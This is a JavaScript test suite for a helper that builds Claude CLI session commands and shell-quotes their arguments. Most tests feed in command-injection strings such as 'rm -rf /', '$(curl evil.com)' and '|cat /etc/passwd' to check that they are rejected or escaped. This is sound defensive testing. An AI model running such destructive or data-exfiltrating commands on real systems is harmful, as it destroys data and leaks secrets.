const test = require('node:test');
const assert = require('node:assert/strict');
const { buildClaudeCmd, shq } = require('../claude-cmd');

const UID = '12345678-aaaa-bbbb-cccc-1234567890ab';

test('rejects non-UUID sessionId', () => {
  const r = buildClaudeCmd({ sessionId: 'bogus; rm -rf ~', isNew: true });
  assert.equal(r.ok, false);
});

test('builds minimal new-session command', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true });
  assert.equal(r.ok, true);
  assert.equal(r.cmd, `claude --session-id '${UID}'`);
});

test('builds resume command', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: false });
  assert.equal(r.ok, true);
  assert.equal(r.cmd, `claude --resume '${UID}'`);
});

test('rejects unknown permissionMode', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { permissionMode: '; rm -rf /' } });
  assert.equal(r.ok, false);
});

test('accepts known permissionMode', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { permissionMode: 'plan' } });
  assert.equal(r.ok, true);
  assert.match(r.cmd, /--permission-mode 'plan'/);
});

test('rejects worktreeName with metacharacters', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { worktree: true, worktreeName: '$(rm -rf ~)' } });
  assert.equal(r.ok, false);
});

test('rejects forkFrom that is not a UUID-ish string', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: false, sessionOptions: { forkFrom: "$(curl evil.com)" } });
  assert.equal(r.ok, false);
});

test('escapes single quotes inside validated values', () => {
  // permissionMode is whitelisted, so attempt via... actually we can only test
  // the escape function directly since all validated fields reject quotes.
  assert.equal(shq("it's"), `'it'\\''s'`);
});

test('addDirs produces two --add-dir args, each single-quoted', () => {
  const r = buildClaudeCmd({
    sessionId: UID,
    isNew: true,
    sessionOptions: { addDirs: '/tmp/with space,/tmp/ok' },
  });
  assert.equal(r.ok, true);
  // Two --add-dir occurrences, each followed by a single-quoted absolute path.
  const matches = r.cmd.match(/--add-dir '[^']+'/g) || [];
  assert.equal(matches.length, 2);
});

test('appendSystemPrompt substitutes a cat expression over the temp path', () => {
  const r = buildClaudeCmd({
    sessionId: UID,
    isNew: true,
    sessionOptions: { appendSystemPrompt: 'hello' },
    tmpPromptPath: '/tmp/switchboard-prompt-abc.md',
  });
  assert.equal(r.ok, true);
  assert.match(r.cmd, /--append-system-prompt "\$\(cat '\/tmp\/switchboard-prompt-abc\.md'\)"/);
});

test('preLaunchCmd is prepended as-is (documented behavior)', () => {
  const r = buildClaudeCmd({
    sessionId: UID,
    isNew: true,
    sessionOptions: { preLaunchCmd: 'export FOO=bar &&' },
  });
  assert.equal(r.ok, true);
  assert.ok(r.cmd.startsWith('export FOO=bar && claude'));
});

// ── Injection / boundary vectors ────────────────────────────────────

test('rejects newline-in-permissionMode', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { permissionMode: 'plan\n; rm -rf /' } });
  assert.equal(r.ok, false);
});

test('rejects tab-in-worktreeName', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { worktree: true, worktreeName: 'foo\tbar' } });
  assert.equal(r.ok, false);
});

test('rejects NUL byte in sessionId', () => {
  const r = buildClaudeCmd({ sessionId: 'abcd1234\x00-a-b-c-d', isNew: true });
  assert.equal(r.ok, false);
});

test('rejects space in worktreeName', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { worktree: true, worktreeName: 'my branch' } });
  assert.equal(r.ok, false);
});

test('rejects overly long worktreeName', () => {
  const long = 'a'.repeat(200);
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { worktree: true, worktreeName: long } });
  assert.equal(r.ok, false);
});

test('rejects overly long sessionId (bypass attempt)', () => {
  const long = 'a'.repeat(100);
  const r = buildClaudeCmd({ sessionId: long, isNew: true });
  assert.equal(r.ok, false);
});

test('each known permissionMode is accepted', () => {
  for (const mode of ['plan', 'acceptEdits', 'default', 'bypassPermissions']) {
    const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { permissionMode: mode } });
    assert.equal(r.ok, true, `mode=${mode}`);
    assert.ok(r.cmd.includes(`--permission-mode '${mode}'`));
  }
});

test('dangerouslySkipPermissions wins over permissionMode', () => {
  const r = buildClaudeCmd({
    sessionId: UID,
    isNew: true,
    sessionOptions: { dangerouslySkipPermissions: true, permissionMode: 'plan' },
  });
  assert.equal(r.ok, true);
  assert.ok(r.cmd.includes('--dangerously-skip-permissions'));
  assert.ok(!r.cmd.includes('--permission-mode'));
});

test('chrome flag appears only when requested', () => {
  const withChrome = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { chrome: true } });
  const withoutChrome = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: {} });
  assert.ok(withChrome.cmd.includes('--chrome'));
  assert.ok(!withoutChrome.cmd.includes('--chrome'));
});

test('empty addDirs string produces no --add-dir args', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { addDirs: '' } });
  assert.equal(r.ok, true);
  assert.ok(!r.cmd.includes('--add-dir'));
});

test('addDirs with only whitespace separators is ignored', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { addDirs: ' , , ' } });
  assert.equal(r.ok, true);
  assert.ok(!r.cmd.includes('--add-dir'));
});

test('permissionMode must match exactly (case-sensitive, no trailing whitespace)', () => {
  assert.equal(buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { permissionMode: 'PLAN' } }).ok, false);
  assert.equal(buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { permissionMode: 'plan ' } }).ok, false);
});

test('combined options assemble in expected order', () => {
  const r = buildClaudeCmd({
    sessionId: UID,
    isNew: true,
    sessionOptions: {
      permissionMode: 'acceptEdits',
      worktree: true,
      worktreeName: 'feature/x',
      chrome: true,
      addDirs: '/tmp/a,/tmp/b',
    },
  });
  assert.equal(r.ok, true);
  assert.ok(r.cmd.indexOf('--permission-mode') < r.cmd.indexOf('--worktree'));
  assert.ok(r.cmd.indexOf('--worktree') < r.cmd.indexOf('--chrome'));
  assert.ok(r.cmd.indexOf('--chrome') < r.cmd.indexOf('--add-dir'));
});

test('forkFrom with dangerous characters is rejected (no silent truncation)', () => {
  const vectors = [
    '`reboot`',
    '$(id)',
    '|cat /etc/passwd',
    '; rm -rf ~',
    '&& curl evil',
    "\nid\n",
  ];
  for (const v of vectors) {
    assert.equal(
      buildClaudeCmd({ sessionId: UID, isNew: false, sessionOptions: { forkFrom: v } }).ok,
      false,
      `expected rejection for ${JSON.stringify(v)}`
    );
  }
});

test('sessionOptions: undefined behaves like {}', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: undefined });
  assert.equal(r.ok, true);
  assert.equal(r.cmd, `claude --session-id '${UID}'`);
});

test('worktreeName with forward slashes is accepted (git branch names)', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { worktree: true, worktreeName: 'feature/nested/branch' } });
  assert.equal(r.ok, true);
  assert.ok(r.cmd.includes(`'feature/nested/branch'`));
});

test('worktree=true but no worktreeName emits bare --worktree', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { worktree: true } });
  assert.equal(r.ok, true);
  assert.ok(r.cmd.includes('--worktree'));
  // No stray quoted arg after --worktree.
  assert.ok(!/--worktree\s+'/.test(r.cmd));
});

test('appendSystemPrompt without tmpPromptPath omits the flag', () => {
  const r = buildClaudeCmd({
    sessionId: UID,
    isNew: true,
    sessionOptions: { appendSystemPrompt: 'hello' },
  });
  assert.equal(r.ok, true);
  assert.ok(!r.cmd.includes('--append-system-prompt'));
});

test('shq quotes a string containing special shell metachars', () => {
  // Each of these must be preserved literally — shell should see them as data.
  for (const s of ['$HOME', '`id`', '; rm -rf /', '$(curl evil)', "it's a test"]) {
    const quoted = shq(s);
    // No unescaped single quotes should appear inside except the outer wrappers
    // and the ' + \\'' + ' pattern.
    assert.ok(quoted.startsWith("'") && quoted.endsWith("'"), `wrap failed: ${quoted}`);
  }
});

test('appends initialPrompt as final positional arg, escaped', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { initialPrompt: "/sb-work T-1 — it's go time" } });
  assert.equal(r.ok, true);
  assert.ok(r.cmd.endsWith(`'/sb-work T-1 — it'\\''s go time'`), r.cmd);
});

test('initialPrompt comes after flags', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: false, sessionOptions: { permissionMode: 'acceptEdits', initialPrompt: 'hello' } });
  assert.equal(r.ok, true);
  assert.match(r.cmd, /--permission-mode 'acceptEdits' 'hello'$/);
});

test('rejects initialPrompt with control characters', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { initialPrompt: 'evil\x07bell' } });
  assert.equal(r.ok, false);
});

test('allows multi-line initialPrompt', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { initialPrompt: 'line1\nline2' } });
  assert.equal(r.ok, true);
});

test('rejects oversized initialPrompt', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { initialPrompt: 'x'.repeat(9000) } });
  assert.equal(r.ok, false);
});
